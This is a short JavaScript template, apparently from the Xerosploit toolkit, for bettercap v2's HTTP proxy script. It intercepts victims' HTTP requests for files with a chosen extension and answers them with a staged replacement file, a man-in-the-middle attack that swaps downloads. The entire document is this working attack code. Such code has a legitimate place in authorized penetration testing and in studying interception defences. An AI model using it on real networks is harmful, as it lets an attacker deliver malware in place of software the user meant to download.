// Xerosploit rdownload template for bettercap v2 (http.proxy.script).
// __EXT__ is replaced by xerosploit.py with the file extension (no dot),
// __REPLACE_FILE__ with the staged replacement file path.
function onRequest(req, res) {
  if( req.Path.indexOf('.__EXT__') !== -1 ){
    res.Status = 200;
    res.ContentType = "application/octet-stream";
    res.Body = readFile("__REPLACE_FILE__");
  }
}
